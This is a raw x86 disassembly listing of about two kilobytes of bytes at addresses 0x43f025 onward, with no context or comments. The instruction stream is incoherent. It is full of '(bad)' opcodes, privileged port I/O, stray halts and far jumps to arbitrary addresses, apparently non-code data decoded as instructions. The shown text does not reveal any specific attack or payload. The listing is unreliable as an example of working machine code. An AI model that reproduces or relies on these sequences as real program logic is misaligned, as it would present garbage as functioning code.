  43f025:	les    eax,FWORD PTR [edi]
  43f027:	clc    
  43f028:	mov    BYTE PTR ds:0x609c9f4b,0x29
  43f02f:	push   edi
  43f030:	sbb    esi,DWORD PTR fs:[ebx+0x1366c130]
  43f037:	pop    esp
  43f038:	mov    ch,bh
  43f03a:	sar    DWORD PTR [eax],0xd3
  43f03d:	mov    bh,al
  43f03f:	and    bl,BYTE PTR [esi+0x11126029]
  43f045:	inc    edx
  43f046:	and    BYTE PTR [ebp-0x21a48102],cl
  43f04c:	dec    esi
  43f04d:	in     al,0x30
  43f04f:	jmp    FWORD PTR [ebx-0x3c6c9129]
  43f055:	xchg   ebp,eax
  43f056:	xor    eax,0x526c69dc
  43f05b:	cmc    
  43f05c:	icebp  
  43f05d:	add    dh,BYTE PTR [edx-0x43]
  43f060:	inc    edx
  43f061:	mov    al,ds:0xeec9f51a
  43f066:	ins    DWORD PTR es:[edi],dx
  43f067:	repz xor ebx,DWORD PTR [ebx]
  43f06a:	inc    ecx
  43f06b:	and    eax,0xaa70f4e9
  43f070:	cld    
  43f071:	add    cl,BYTE PTR [edx+0x52]
  43f074:	mov    bl,0xf6
  43f076:	or     BYTE PTR [edx-0x229f7424],bh
  43f07c:	and    bl,BYTE PTR [ecx+eax*1]
  43f07f:	fld    st(6)
  43f081:	scas   al,BYTE PTR es:[edi]
  43f082:	clc    
  43f083:	xlat   BYTE PTR ds:[ebx]
  43f084:	dec    edi
  43f085:	mov    dh,0x2d
  43f087:	cmp    eax,0x5ec816e
  43f08c:	mov    edx,DWORD PTR [eax-0x29]
  43f08f:	in     eax,0x1b
  43f091:	sbb    eax,0x49aa7c36
  43f096:	mov    ds:0x39f418c5,eax
  43f09b:	aam    0xe7
  43f09d:	add    ecx,DWORD PTR [eax]
  43f09f:	outs   dx,BYTE PTR ds:[esi]
  43f0a0:	adc    bh,ah
  43f0a2:	popf   
  43f0a3:	push   ebp
  43f0a4:	mov    BYTE PTR [ecx],al
  43f0a6:	cs fsubr st,st(1)
  43f0a9:	pop    ss
  43f0aa:	mov    bl,0xf2
  43f0ac:	sub    esp,DWORD PTR [esi]
  43f0ae:	push   0xffffffb2
  43f0b0:	dec    edi
  43f0b1:	imul   ebp
  43f0b3:	call   0xe3a2:0xfffe022
  43f0ba:	addr16 leave 
  43f0bc:	or     DWORD PTR [edx+0x15],ebx
  43f0bf:	sti    
  43f0c0:	mov    DWORD PTR [ebp+0x2e],eax
  43f0c3:	add    ah,BYTE PTR ds:0xffe6033a
  43f0c9:	daa    
  43f0ca:	stos   BYTE PTR es:[edi],al
  43f0cb:	xor    eax,0x411fdfc7
  43f0d0:	out    0xe6,eax
  43f0d2:	sub    eax,0x27f78eb4
  43f0d7:	mov    esp,0xe5c6b51e
  43f0dc:	scas   al,BYTE PTR es:[edi]
  43f0dd:	adc    BYTE PTR [ebx],0xd7
  43f0e0:	je     0x43f075
  43f0e2:	loop   0x43f136
  43f0e4:	test   edx,eax
  43f0e6:	in     al,0xb6
  43f0e8:	inc    ecx
  43f0e9:	loope  0x43f10a
  43f0eb:	push   ecx
  43f0ec:	mov    edi,0x33ae4a01
  43f0f1:	inc    ebx
  43f0f2:	dec    eax
  43f0f3:	retf   0x1ce1
  43f0f6:	call   0xb9a4f6b0
  43f0fb:	std    
  43f0fc:	jmp    0xffae:0xcf2573a8
  43f103:	jae    0x43f13e
  43f105:	ja     0x43f160
  43f107:	jecxz  0x43f0ad
  43f109:	sub    esp,DWORD PTR [ebp-0x33]
  43f10c:	mov    esp,0x9875dde3
  43f111:	cmp    eax,0x2a04d41e
  43f116:	mov    ecx,0x622c0a2
  43f11b:	mov    esi,0xb117e9d5
  43f120:	mov    BYTE PTR [ebp-0x13],al
  43f123:	loop   0x43f101
  43f125:	inc    ebx
  43f126:	sbb    BYTE PTR [ebp+0x59e24b2a],ch
  43f12c:	mov    al,0x7a
  43f12e:	(bad)  
  43f12f:	cld    
  43f130:	stc    
  43f131:	jne    0x43f178
  43f133:	(bad)  [ecx-0x6f4ae084]
  43f139:	jg     0x43f15f
  43f13b:	push   ebp
  43f13c:	ds sbb eax,0xa7d5fbe
  43f142:	fldenv [esi-0x226a3ad6]
  43f148:	pop    eax
  43f149:	mov    ebx,0x19bc674b
  43f14e:	push   ds
  43f14f:	aaa    
  43f150:	add    eax,ecx
  43f152:	mov    ah,0x92
  43f154:	repnz add eax,0x3c815bd6
  43f15a:	add    edi,DWORD PTR [edi]
  43f15c:	call   0xc2e5107a
  43f161:	outs   dx,BYTE PTR ds:[esi]
  43f162:	dec    eax
  43f163:	shr    BYTE PTR [eax+0x25],cl
  43f166:	adc    dl,ah
  43f168:	mov    ebx,0x2af67912
  43f16d:	stc    
  43f16e:	pop    edx
  43f16f:	pop    eax
  43f170:	mov    BYTE PTR [edi],ah
  43f172:	test   eax,0x4915529a
  43f177:	xchg   ecx,eax
  43f178:	stos   BYTE PTR es:[edi],al
  43f179:	jne    0x43f18c
  43f17b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  43f17c:	pop    ebp
  43f17d:	dec    edx
  43f17e:	aas    
  43f17f:	pop    ebx
  43f180:	and    ebx,esp
  43f182:	and    cl,BYTE PTR [edi+0x8]
  43f185:	(bad)  
  43f186:	pusha  
  43f187:	mov    ebx,0x2706bbc2
  43f18c:	into   
  43f18d:	ins    BYTE PTR es:[edi],dx
  43f18e:	lock aam 0x1b
  43f191:	xor    al,0x7b
  43f193:	mov    ds:0x10f54545,eax
  43f198:	mov    DWORD PTR [edi-0x1611934b],edi
  43f19e:	(bad)  
  43f1a0:	pop    eax
  43f1a1:	add    bl,ah
  43f1a3:	rcl    DWORD PTR [ebx+0x60ef7bf8],0xe5
  43f1aa:	pusha  
  43f1ab:	test   eax,0x54da9a68
  43f1b0:	sub    dl,bh
  43f1b2:	scas   eax,DWORD PTR es:[edi]
  43f1b3:	aad    0xb7
  43f1b5:	daa    
  43f1b6:	je     0x43f1d8
  43f1b8:	mov    ebp,0x886110db
  43f1bd:	push   ebp
  43f1be:	xchg   edi,eax
  43f1bf:	cmp    edi,DWORD PTR [edx+0x7e]
  43f1c2:	ins    BYTE PTR es:[edi],dx
  43f1c3:	mov    ecx,esp
  43f1c5:	add    BYTE PTR [esi],al
  43f1c7:	test   dl,ah
  43f1c9:	cmc    
  43f1ca:	dec    ebp
  43f1cb:	sar    BYTE PTR [ebx+ebx*8+0x38],cl
  43f1cf:	test   eax,0x195a2d88
  43f1d4:	dec    eax
  43f1d5:	jecxz  0x43f1ce
  43f1d7:	mov    ah,0x15
  43f1d9:	add    dl,BYTE PTR [eax-0x4646da7b]
  43f1df:	xchg   ecx,eax
  43f1e0:	stc    
  43f1e1:	mov    ebp,0x849efb91
  43f1e6:	out    0xd4,eax
  43f1e8:	or     DWORD PTR [ebx],edi
  43f1ea:	add    BYTE PTR [ebx],0xb8
  43f1ed:	hlt    
  43f1ee:	(bad)  
  43f1f0:	cmp    DWORD PTR [eax+0x4c],ebx
  43f1f3:	dec    esp
  43f1f4:	mov    ds,WORD PTR [ecx-0x74762eb1]
  43f1fa:	or     esp,0xffffffe6
  43f1fd:	js     0x43f1c7
  43f1ff:	dec    esp
  43f200:	inc    esp
  43f201:	add    bh,BYTE PTR [esp+ebx*1+0x75]
  43f205:	mov    bh,0x42
  43f207:	mov    esp,0x5d1f2186
  43f20c:	fisttp WORD PTR [esi+0x21]
  43f20f:	push   cs
  43f210:	mov    edx,0x96d4df55
  43f215:	add    esp,ebx
  43f217:	clc    
  43f218:	inc    esp
  43f219:	imul   edi,DWORD PTR [edx-0x1fb677da],0xffffffb3
  43f220:	fsubr  QWORD PTR [ebp-0x77]
  43f223:	inc    eax
  43f224:	and    al,BYTE PTR [edx]
  43f226:	mov    eax,0x5e69c252
  43f22b:	or     BYTE PTR [esi],ah
  43f22d:	adc    al,0x2a
  43f22f:	mov    ds:0xffe62f89,eax
  43f234:	xor    bh,BYTE PTR [esi+0x3]
  43f237:	xchg   esp,eax
  43f238:	mov    eax,ds:0xf86d2405
  43f23d:	ja     0x43f262
  43f23f:	dec    edi
  43f240:	cmp    BYTE PTR [eax],bh
  43f242:	gs mov ch,0xff
  43f245:	fucom  st(7)
  43f247:	push   es
  43f248:	xchg   edi,eax
  43f249:	push   edx
  43f24a:	in     eax,dx
  43f24b:	jmp    0xce9a11da
  43f250:	inc    ebx
  43f251:	into   
  43f252:	(bad)  
  43f253:	int    0xe8
  43f255:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f256:	scas   eax,DWORD PTR es:[edi]
  43f257:	out    dx,eax
  43f258:	mov    cl,0x1
  43f25a:	or     cl,BYTE PTR [edi+0x7540c387]
  43f260:	test   al,0x86
  43f262:	push   ebx
  43f263:	sbb    ecx,DWORD PTR [edi]
  43f265:	add    bh,BYTE PTR [edx]
  43f267:	push   0x3c38bbb8
  43f26c:	pop    ds
  43f26d:	in     eax,0x60
  43f26f:	scas   eax,DWORD PTR es:[edi]
  43f270:	xchg   esp,eax
  43f271:	mov    edx,0xc04c482a
  43f276:	aad    0xd5
  43f278:	jnp    0x43f209
  43f27a:	jmp    0x43f255
  43f27c:	xchg   BYTE PTR [eax-0x1b],al
  43f27f:	mov    eax,0xd205ad88
  43f284:	xchg   edi,eax
  43f285:	sub    ecx,esi
  43f287:	push   ebx
  43f288:	pusha  
  43f289:	inc    ebp
  43f28a:	cmp    dh,BYTE PTR [ebp+ebp*2+0x6537fe03]
  43f291:	aam    0x9e
  43f293:	cmp    cl,BYTE PTR [ecx-0x1f0509d3]
  43f299:	ds stos BYTE PTR es:[edi],al
  43f29b:	push   ebx
  43f29c:	bnd jne 0x43f247
  43f29f:	out    dx,al
  43f2a0:	mov    DWORD PTR [ebx-0x68ea90db],eax
  43f2a6:	test   ecx,edx
  43f2a8:	mov    ah,0xb9
  43f2aa:	ins    BYTE PTR es:[edi],dx
  43f2ab:	mov    DWORD PTR [bx+di+0x70],edx
  43f2af:	scas   al,BYTE PTR es:[edi]
  43f2b0:	aam    0x4e
  43f2b2:	call   ebp
  43f2b4:	xchg   ebp,eax
  43f2b5:	sti    
  43f2b6:	adc    edx,DWORD PTR [esi-0x9]
  43f2b9:	inc    eax
  43f2ba:	stc    
  43f2bb:	pop    ebx
  43f2bc:	or     DWORD PTR [ebx+0x2a3c2d29],eax
  43f2c2:	jge    0x43f299
  43f2c4:	adc    eax,0x53a7ce00
  43f2c9:	jo     0x43f26d
  43f2cb:	jb     0x43f256
  43f2cd:	and    eax,0x9b0edf5d
  43f2d2:	add    ch,bl
  43f2d4:	add    al,0x3
  43f2d6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f2d7:	or     cl,BYTE PTR [ebp-0x7d]
  43f2da:	fmulp  st(6),st
  43f2dc:	xor    eax,0xc05d9e8d
  43f2e1:	mov    esi,DWORD PTR [edx+0xa73c2d4]
  43f2e7:	cmp    al,0xe1
  43f2e9:	fstp   QWORD PTR [ecx]
  43f2eb:	(bad)  [eax-0x2]
  43f2ee:	add    bh,dl
  43f2f0:	cmp    ch,BYTE PTR [eax-0xa2a5544]
  43f2f6:	or     DWORD PTR [edx+0x4d0e7588],edi
  43f2fc:	inc    ebp
  43f2fd:	or     DWORD PTR ds:0xd44b055e,0xdb379892
  43f307:	aam    0xad
  43f309:	pop    ebx
  43f30a:	stos   DWORD PTR es:[edi],eax
  43f30b:	dec    ebp
  43f30c:	cmc    
  43f30d:	push   0x6ff86b1f
  43f312:	sahf   
  43f313:	cli    
  43f314:	data16 sub al,0x95
  43f317:	aam    0xfc
  43f319:	retf   
  43f31a:	loope  0x43f32a
  43f31c:	adc    DWORD PTR [ebx],0xf
  43f31f:	xor    al,BYTE PTR [edx-0x7a6f961d]
  43f325:	test   BYTE PTR [esp+edx*8+0x348ec4ab],dl
  43f32c:	mov    DWORD PTR [ecx+0x4d],esp
  43f32f:	sar    BYTE PTR [ebx-0x48e95919],0x5
  43f336:	and    ah,BYTE PTR [edx-0x1e]
  43f339:	int3   
  43f33a:	add    eax,0x608dab98
  43f33f:	inc    ebx
  43f340:	jg     0x43f331
  43f342:	xchg   esp,eax
  43f343:	in     al,0x97
  43f345:	arpl   WORD PTR [esi],di
  43f347:	and    al,0x84
  43f349:	and    DWORD PTR [eax+0x17],0xc943dbb2
  43f350:	loop   0x43f388
  43f352:	pop    ds
  43f353:	sbb    ebp,esp
  43f355:	in     eax,dx
  43f356:	das    
  43f357:	xchg   ecx,eax
  43f358:	sub    bl,bl
  43f35a:	dec    ebp
  43f35b:	aam    0x9f
  43f35d:	fwait
  43f35e:	cmp    al,0x67
  43f360:	push   dx
  43f362:	xchg   ecx,eax
  43f363:	mov    dl,0x86
  43f365:	sbb    DWORD PTR [ebx],ebx
  43f367:	inc    ebx
  43f368:	movd   mm7,DWORD PTR [edi]
  43f36b:	outs   dx,DWORD PTR ds:[esi]
  43f36c:	cmp    al,ah
  43f36e:	and    edx,esp
  43f370:	xchg   DWORD PTR [eax-0x5b8b0b49],ebp
  43f376:	aas    
  43f377:	jns    0x43f30f
  43f379:	push   ebx
  43f37a:	(bad)  
  43f37b:	das    
  43f37c:	cdq    
  43f37d:	or     ah,al
  43f37f:	lods   eax,DWORD PTR ds:[esi]
  43f380:	cmp    al,0xfc
  43f382:	sti    
  43f383:	add    DWORD PTR [edx+0x3],ebx
  43f386:	and    al,0x13
  43f388:	fsubr  QWORD PTR [esi+eiz*1]
  43f38b:	xor    cl,BYTE PTR [edx+ebp*1-0x448e24e1]
  43f392:	loopne 0x43f3fa
  43f394:	in     eax,0xcc
  43f396:	neg    DWORD PTR [eax-0x4e]
  43f399:	ret    
  43f39a:	adc    ah,dl
  43f39c:	(bad)  
  43f39d:	inc    eax
  43f39e:	sbb    eax,0x2fb8c206
  43f3a3:	inc    edi
  43f3a4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f3a5:	lea    ebx,[ecx]
  43f3a7:	neg    BYTE PTR [edi-0x162a237d]
  43f3ad:	rcr    BYTE PTR [eax],0xf1
  43f3b0:	out    0x0,al
  43f3b2:	push   cs
  43f3b3:	dec    esi
  43f3b4:	add    al,0x3f
  43f3b6:	mov    dh,0xd6
  43f3b8:	mov    edi,0x89d636e2
  43f3bd:	lgs    ebx,FWORD PTR [edi+0x74]
  43f3c1:	or     al,0xd6
  43f3c3:	mov    ?,edx
  43f3c5:	add    eax,0xb05c7402
  43f3ca:	int3   
  43f3cb:	lods   eax,DWORD PTR ds:[esi]
  43f3cc:	outs   dx,DWORD PTR ds:[esi]
  43f3cd:	mov    ah,0x65
  43f3cf:	imul   esp,DWORD PTR [ebx-0x1a00c76e],0x571e6b62
  43f3d9:	add    dl,BYTE PTR [edx+ecx*8+0x5d0e3e93]
  43f3e0:	cmp    edx,DWORD PTR [eax+0xb]
  43f3e3:	adc    BYTE PTR [esi+0x166ddb95],dl
  43f3e9:	inc    ebx
  43f3ea:	xor    ah,ch
  43f3ec:	es push es
  43f3ee:	data16 aam 0xdf
  43f3f1:	test   eax,0x24adc490
  43f3f6:	xor    BYTE PTR [ebx-0x77],cl
  43f3f9:	out    0xee,eax
  43f3fb:	ins    BYTE PTR es:[edi],dx
  43f3fc:	dec    ebx
  43f3fd:	push   ebx
  43f3fe:	popf   
  43f3ff:	icebp  
  43f400:	aaa    
  43f401:	add    dh,ah
  43f403:	mov    edx,0x71980bf5
  43f408:	add    eax,0xaadb1ffb
  43f40d:	stos   DWORD PTR es:[edi],eax
  43f40e:	ret    0xd0d6
  43f411:	push   es
  43f412:	nop
  43f413:	aad    0x67
  43f415:	mov    bh,0x3d
  43f417:	push   es
  43f418:	add    ebx,DWORD PTR [ebx+0x7]
  43f41b:	in     eax,0xe8
  43f41d:	sbb    BYTE PTR [edi],0x3b
  43f420:	dec    edi
  43f421:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f422:	outs   dx,DWORD PTR ds:[esi]
  43f423:	push   cs
  43f424:	call   0xc617fe6d
  43f429:	mov    BYTE PTR ss:[ebx-0x7c],ah
  43f42d:	out    dx,al
  43f42e:	ds mov ebx,0xc25d2189
  43f434:	mov    esp,0x420e5ab9
  43f439:	add    eax,0x87f2d5ef
  43f43e:	lods   eax,DWORD PTR ds:[esi]
  43f43f:	js     0x43f3e2
  43f441:	adc    BYTE PTR [edx+ecx*2],0x88
  43f445:	jmp    FWORD PTR [ebp-0x255f8f9]
  43f44b:	and    eax,0xff402e5
  43f450:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f451:	dec    esi
  43f452:	dec    ecx
  43f453:	pop    ds
  43f454:	cdq    
  43f455:	pop    edi
  43f456:	push   ds
  43f457:	and    DWORD PTR ds:0xa01dd34d,esp
  43f45d:	jbe    0x43f489
  43f45f:	adc    eax,DWORD PTR [edi+0x1c]
  43f462:	hlt    
  43f463:	push   esp
  43f464:	add    DWORD PTR [eax],ebx
  43f466:	sbb    eax,0x36cce961
  43f46b:	mov    bl,0x8b
  43f46d:	dec    ebx
  43f46e:	xor    al,0x6c
  43f470:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f471:	enter  0xaf05,0x18
  43f475:	pop    ecx
  43f476:	lea    edi,[edx-0x7ba8ddd3]
  43f47c:	repnz adc BYTE PTR [ecx],0xd5
  43f480:	mov    dl,0x5f
  43f482:	sub    dl,BYTE PTR [edx]
  43f484:	mov    DWORD PTR [ecx+0x242eafb2],ebx
  43f48a:	outs   dx,BYTE PTR ds:[esi]
  43f48b:	clc    
  43f48c:	scas   eax,DWORD PTR es:[edi]
  43f48d:	ins    DWORD PTR es:[edi],dx
  43f48e:	hlt    
  43f48f:	arpl   WORD PTR [ebx-0x10f059fb],bp
  43f495:	jge    0x43f497
  43f497:	gs mov esi,ecx
  43f49a:	mov    esi,0x8096f0a1
  43f49f:	in     eax,0x58
  43f4a1:	loope  0x43f46a
  43f4a3:	aad    0xe
  43f4a5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f4a6:	dec    edx
  43f4a7:	xchg   ebp,eax
  43f4a8:	pop    esi
  43f4a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  43f4aa:	sbb    al,0x9d
  43f4ac:	mov    DWORD PTR [ecx+0xd],esp
  43f4af:	mov    ebp,0xaf1432e1
  43f4b4:	inc    eax
  43f4b5:	add    edi,DWORD PTR [esi-0x25]
  43f4b8:	daa    
  43f4b9:	in     al,dx
  43f4ba:	test   DWORD PTR [edx],ebp
  43f4bc:	(bad)
  43f4c1:	add    DWORD PTR [ecx-0xa97cd0f],edx
  43f4c7:	xchg   edi,eax
  43f4c8:	enter  0xe317,0xab
  43f4cc:	scas   eax,DWORD PTR es:[edi]
  43f4cd:	pop    edi
  43f4ce:	in     al,0xe4
  43f4d0:	jno    0x43f4dd
  43f4d2:	inc    edi
  43f4d3:	ret    
  43f4d4:	clc    
  43f4d5:	retf   0xcd5b
  43f4d8:	mov    cl,0xe7
  43f4da:	out    0xd3,al
  43f4dc:	mov    edx,0xf4f70969
  43f4e1:	int3   
  43f4e2:	loope  0x43f4b9
  43f4e4:	jge    0x43f4b6
  43f4e6:	xchg   BYTE PTR [ecx-0x60],bh
  43f4e9:	fwait
  43f4ea:	push   0x603f88bc
  43f4ef:	mov    bh,0x84
  43f4f1:	xlat   BYTE PTR ds:[ebx]
  43f4f2:	push   ebx
  43f4f3:	inc    esi
  43f4f4:	test   al,0x14
  43f4f6:	cmp    BYTE PTR [ebx-0x2e],dh
  43f4f9:	icebp  
  43f4fa:	sahf   
  43f4fb:	mov    ah,0x8a
  43f4fd:	xor    bh,dl
  43f4ff:	aas    
  43f500:	mov    DWORD PTR ds:0xc16c2df1,edi
  43f506:	push   ebx
  43f507:	mov    dl,0x56
  43f509:	adc    eax,0xaec9b966
  43f50e:	sub    dh,BYTE PTR [eax+esi*2-0x37]
  43f512:	and    eax,0x234f8962
  43f517:	jge    0x43f4c5
  43f519:	mov    eax,ds:0xe5f2bc0b
  43f51e:	sbb    dl,bh
  43f520:	or     BYTE PTR [ebx],dl
  43f522:	inc    esp
  43f523:	sub    DWORD PTR [edx],0x895291e0
  43f529:	xchg   edi,eax
  43f52a:	(bad)  
  43f52b:	fdivr  QWORD PTR [edx+ecx*1]
  43f52e:	and    BYTE PTR [ebx],bh
  43f530:	enter  0x7c05,0xf2
  43f534:	and    eax,0x53f9b990
  43f539:	pop    ebx
  43f53a:	push   ds
  43f53b:	mov    bh,0x60
  43f53d:	retf   0x2572
  43f540:	loop   0x43f533
  43f542:	iret   
  43f543:	shl    DWORD PTR [esi-0x70924db4],cl
  43f549:	stos   BYTE PTR es:[edi],al
  43f54a:	nop
  43f54b:	inc    edx
  43f54c:	pop    ds
  43f54d:	sbb    BYTE PTR [edi],0x79
  43f550:	fcmovne st,st(2)
  43f552:	aaa    
  43f553:	adc    eax,0xd458548a
  43f558:	test   eax,0x4390c705
  43f55d:	ror    BYTE PTR [ebx],1
  43f55f:	push   edi
  43f560:	(bad)  
  43f561:	fild   DWORD PTR [edx+0x753730d5]
  43f567:	xor    eax,edi
  43f569:	pop    ebx
  43f56a:	gs aam 0xe2
  43f56d:	xor    eax,0x81590d21
  43f572:	mov    edx,0xafc9885b
  43f577:	mov    al,ch
  43f579:	push   eax
  43f57a:	mov    dh,0xca
  43f57c:	arpl   WORD PTR [edx],ax
  43f57e:	mov    eax,0x68e8a5ca
  43f583:	push   ecx
  43f584:	leave  
  43f585:	mov    edi,0xa0f78b61
  43f58a:	jmp    0x27c7672e
  43f58f:	icebp  
  43f590:	dec    esp
  43f591:	ret    
  43f592:	dec    edi
  43f593:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f594:	push   esp
  43f595:	test   al,0xe7
  43f597:	or     DWORD PTR [ecx+0x489c29c9],ecx
  43f59d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  43f59e:	sub    DWORD PTR [ebp+0x4d341931],0xd475d9ed
  43f5a8:	mov    dh,0x32
  43f5aa:	xchg   DWORD PTR [esi],ebx
  43f5ac:	mov    BYTE PTR [ebx-0x2f],dh
  43f5af:	cmp    eax,0x3b304474
  43f5b4:	jl     0x43f5b9
  43f5b6:	dec    edx
  43f5b7:	lds    edx,FWORD PTR [ebx]
  43f5b9:	shl    DWORD PTR [esi+eax*8],cl
  43f5bc:	or     eax,0xf2316033
  43f5c1:	mov    dl,0xd9
  43f5c3:	or     eax,0xa317c20a
  43f5c8:	mov    cl,0x4d
  43f5ca:	mov    al,ds:0x2785d782
  43f5cf:	rcl    DWORD PTR [edi],0x70
  43f5d2:	stos   DWORD PTR es:[edi],eax
  43f5d3:	test   edi,esi
  43f5d5:	ja     0x43f569
  43f5d7:	aam    0xf9
  43f5d9:	jnp    0x43f60a
  43f5db:	adc    ecx,DWORD PTR [ebx+edx*2+0x11]
  43f5df:	(bad)  
  43f5e0:	(bad)  
  43f5e1:	aam    0xd8
  43f5e3:	aad    0x24
  43f5e5:	mov    ecx,0x593ddb5c
  43f5ea:	push   ds
  43f5eb:	std    
  43f5ec:	fld    DWORD PTR [edi-0x2b]
  43f5ef:	xchg   ebx,eax
  43f5f0:	data16 jp 0x43f65f
  43f5f3:	xlat   BYTE PTR ds:[ebx]
  43f5f4:	mov    ebx,0x1cd70d37
  43f5f9:	fs mov bh,0xe5
  43f5fc:	aam    0x46
  43f5fe:	ins    BYTE PTR es:[edi],dx
  43f5ff:	jg     0x43f671
  43f601:	in     al,0x5e
  43f603:	ret    
  43f604:	imul   edx,DWORD PTR [eax+0x4a],0x4c037d0b
  43f60b:	mov    dl,0x15
  43f60d:	fbld   TBYTE PTR [esi]
  43f60f:	fucomi st,st(7)
  43f611:	jecxz  0x43f673
  43f613:	loope  0x43f60f
  43f615:	sbb    al,0x28
  43f617:	mov    bh,0xe2
  43f619:	mov    ds:0x92c8d471,al
  43f61e:	mov    al,0x6
  43f620:	xchg   ebx,eax
  43f621:	fidiv  WORD PTR [ecx+0x1f8273f6]
  43f627:	shr    DWORD PTR [edi-0x3173ff3d],1
  43f62d:	rcl    DWORD PTR [edx-0x2c],1
  43f630:	sbb    eax,0xe239986b
  43f635:	or     al,0x63
  43f637:	sti    
  43f638:	jno    0x43f621
  43f63a:	dec    esp
  43f63b:	mov    bl,0xff
  43f63d:	push   ebp
  43f63e:	push   ds
  43f63f:	in     eax,dx
  43f640:	jmp    0x5ec7f8bc
  43f645:	fstp   TBYTE PTR [esi+0x6f7bbfd5]
  43f64b:	jl     0x43f6bb
  43f64d:	pop    ss
  43f64e:	sbb    BYTE PTR ds:0xd28dd787,ah
  43f654:	pop    eax
  43f655:	pusha  
  43f656:	jle    0x43f688
  43f658:	enter  0xee33,0xd4
  43f65c:	mov    ch,0xbf
  43f65e:	enter  0x9700,0x7b
  43f662:	jle    0x43f624
  43f664:	mov    DWORD PTR [ecx+0x141b9511],ecx
  43f66a:	pop    es
  43f66b:	or     eax,0xf1ea0130
  43f670:	pusha  
  43f671:	push   ss
  43f672:	lea    edi,[esi]
  43f674:	repnz fcmovbe st,st(0)
  43f677:	dec    esp
  43f678:	mov    ecx,eax
  43f67a:	fwait
  43f67b:	shr    esp,1
  43f67d:	mov    esp,0x5b6db7c
  43f682:	xor    al,0x2d
  43f684:	inc    esi
  43f685:	mov    ch,0xfa
  43f687:	push   ds
  43f688:	pop    ebp
  43f689:	xchg   edi,eax
  43f68a:	pusha  
  43f68b:	ror    DWORD PTR [eax],cl
  43f68d:	in     al,dx
  43f68e:	daa    
  43f68f:	fcmovne st,st(2)
  43f691:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  43f692:	pop    es
  43f693:	xlat   BYTE PTR ds:[ebx]
  43f694:	daa    
  43f695:	fmul   DWORD PTR ds:0x6e81952e
  43f69b:	fwait
  43f69c:	xchg   BYTE PTR [edi],cl
  43f69e:	out    dx,al
  43f69f:	mov    ah,0x26
  43f6a1:	test   esi,eax
  43f6a3:	std    
  43f6a4:	pop    ss
  43f6a5:	repz mov edx,0xf61c9918
  43f6ab:	dec    ebp
  43f6ac:	mov    eax,0x79f30db1
  43f6b1:	fst    st(6)
  43f6b3:	push   eax
  43f6b4:	mov    BYTE PTR [ebp-0x2c3c4d2e],dh
  43f6ba:	jmp    0x43f6d2
  43f6bc:	test   al,0x2e
  43f6be:	xor    BYTE PTR [ecx],cl
  43f6c0:	lock mov cl,0x3
  43f6c3:	mov    eax,ds:0xa608995
  43f6c8:	jmp    0x8a0afa37
  43f6cd:	lds    esp,FWORD PTR [esi-0x59387092]
  43f6d3:	adc    DWORD PTR [ecx+0x10],esi
  43f6d6:	xor    al,0x95
  43f6d8:	dec    esi
  43f6da:	pusha  
  43f6db:	jne    0x43f756
  43f6dd:	in     eax,0x46
  43f6df:	sbb    cl,BYTE PTR [eax+0xb9b63dd]
  43f6e5:	mov    ebp,0x22dd688
  43f6ea:	mov    ah,0xda
  43f6ec:	adc    ebx,eax
  43f6ee:	pop    ebx
  43f6ef:	les    ebx,FWORD PTR [ebx+ecx*8+0x13d156d]
  43f6f6:	or     al,0xeb
  43f6f8:	test   eax,0x367d5b79
  43f6fd:	jmp    0x43f689
  43f6ff:	adc    DWORD PTR [esi],esp
  43f701:	xchg   BYTE PTR [ebx-0x3b4d77b0],al
  43f707:	push   0x42
  43f709:	pop    esp
  43f70a:	pop    edi
  43f70b:	(bad)  
  43f70c:	mov    bh,dl
  43f70e:	(bad)
  43f712:	stos   DWORD PTR es:[edi],eax
  43f713:	shl    DWORD PTR [eax+0x3],1
  43f716:	sub    BYTE PTR [edi+edi*8+0x9353d14],0x8b
  43f71e:	pusha  
  43f71f:	xor    DWORD PTR [edi+ebp*4+0x79f6a757],esp
  43f726:	xor    ah,dl
  43f728:	pop    esi
  43f729:	fnstcw WORD PTR [edx+0xe]
  43f72c:	inc    eax
  43f72d:	enter  0xc61,0x89
  43f731:	ror    DWORD PTR [edi-0x47],0x67
  43f735:	sub    DWORD PTR [edi-0x49],0xc05c148d
  43f73c:	jne    0x43f75e
  43f73e:	jmp    0x8977:0x2cd0fbf5
  43f745:	pop    es
  43f746:	dec    ebp
  43f747:	stos   DWORD PTR es:[edi],eax
  43f748:	sbb    BYTE PTR [ebp+0x36aa578],bh
  43f74e:	pop    edx
  43f74f:	(bad)  
  43f750:	test   BYTE PTR [ebx],ah
  43f752:	jno    0x43f751
  43f754:	test   eax,0x49491e74
  43f759:	data16 into 
  43f75b:	pop    es
  43f75c:	jp     0x43f763
  43f75e:	sub    eax,0xdef27f99
  43f763:	push   esp
  43f764:	shl    DWORD PTR [ecx+0x3b],0x77
  43f768:	jno    0x43f6f0
  43f76a:	sbb    ch,ah
  43f76c:	hlt    
  43f76d:	mov    ch,0xa
  43f76f:	aam    0x2f
  43f771:	sti    
  43f772:	inc    edi
  43f773:	sbb    al,BYTE PTR [ebx+eiz*4-0x63]
  43f777:	les    eax,FWORD PTR [edx+0x142d6602]
  43f77d:	ja     0x43f779
  43f77f:	xchg   DWORD PTR ds:0x374b1f7e,ecx
  43f785:	sbb    eax,0x613caa3c
  43f78a:	inc    ebp
  43f78b:	aad    0x62
  43f78d:	test   BYTE PTR [ecx-0x5b52589f],bl
  43f793:	js     0x43f71e
  43f795:	std    
  43f796:	rcr    DWORD PTR [ebp-0x2c],0x48
  43f79a:	sbb    DWORD PTR [ecx-0x6a8bff3f],esi
  43f7a0:	and    BYTE PTR [ebp+0x652fdd9a],ch
  43f7a6:	pop    esi
  43f7a7:	pusha  
  43f7a8:	cmp    eax,0x890573ca
  43f7ad:	jg     0x43f81d
  43f7af:	fisubr WORD PTR [edi+0x4d]
  43f7b2:	gs jno 0x43f73e
  43f7b5:	sub    esp,DWORD PTR [edi]
